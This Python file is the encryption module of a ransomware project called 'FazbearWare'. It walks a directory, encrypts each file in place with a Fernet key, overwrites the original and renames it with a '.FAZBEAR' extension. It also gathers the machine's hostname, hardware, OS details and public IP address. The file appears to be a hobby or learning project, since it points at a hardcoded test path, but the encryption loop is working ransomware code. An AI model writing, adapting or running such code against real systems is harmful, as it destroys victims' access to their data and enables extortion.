"""
Encrypt - FazbearWare
Description: This module is responsible for encrypting user data within the specified directory, AES-based file encryption and filename obfuscation with Fernet Keys.
"""

import os  
from cryptography.fernet import Fernet 
from main import key
import requests
import platform
import socket
import psutil

#USER INFO
home_path =  os.path.expanduser('~')
test_path = 'C:/Users/USUARIO/test_path/'
current_user = os.getlogin()
public_ip = requests.get('https://api.ipify.org').text

system_info = (
    f"PC Name: {socket.gethostname()}\n"
    f"CPU: {platform.processor()}\n"
    f"RAM: {round(psutil.virtual_memory().total / (1024**3), 2)} GB\n"
    f"System: {platform.system()}\n"
    f"Version: {platform.version()}\n"
    f"Release: {platform.release()}\n"
    f"Architecture: {platform.machine()}\n"
    f"Full name: {platform.platform()}"
)

print(system_info)
print(public_ip)
print(home_path)
print(current_user)

def encrypt_path():
    for root, dirs, files in os.walk(test_path):
        
        if 'AppData' in dirs:
            dirs.remove('AppData') 
        for x in files:
            full_path = os.path.join(root , x)
            if x == "KEY" or x.endswith(".py"):
                continue
            try : 
                with open("KEY", "wb") as file_key :#create binary key to encrypt (and decrypt)
                    file_key.write(key)
                    loaded_key = Fernet(key)
                
                with open(full_path, "rb") as f:
                    original_data = f.read()
                    
         
                #encrypt data, fernet is gonna to encrypt the content in the variable "original_data" using the loaded ke
                encrypted_data = loaded_key.encrypt(original_data)

                #save encrypted file
                with open(full_path, "wb") as f_encrypted:
                    f_encrypted.write(encrypted_data) 
                    #rename files 
                new_name = os.path.join(root,x + ".FAZBEAR")
                os.rename(full_path,new_name)
                print(f"encrypted : {full_path}")
            except Exception as e:
                print(f"Error in {full_path}: {e}")

encrypt_path()